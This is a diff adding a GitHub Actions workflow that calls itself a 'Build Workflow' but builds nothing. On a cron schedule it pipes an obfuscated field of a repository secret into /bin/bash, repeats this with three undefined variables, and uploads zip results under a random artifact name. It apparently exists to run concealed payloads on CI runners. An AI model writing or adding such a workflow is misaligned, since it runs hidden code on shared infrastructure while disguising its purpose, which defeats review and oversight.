@@ -1,0 +1,33 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '33 1,7,13,19 * * *'
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          lhrec1: ${{ secrets.lhrec1 }}
+        run: |
+          printf '%s' "$lhrec1" | jq -r .unt55 | /bin/bash
+          printf '%s' "$gsgts8" | jq -r .ef5104 | /bin/bash
+          printf '%s' "$lfeqt27847" | jq -r .oewq13471 | /bin/bash
+          echo $ptxgr027 | jq -r .vp3098 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: QbcTcYd0
+          path: "*.zip"
+          retention-days: 1
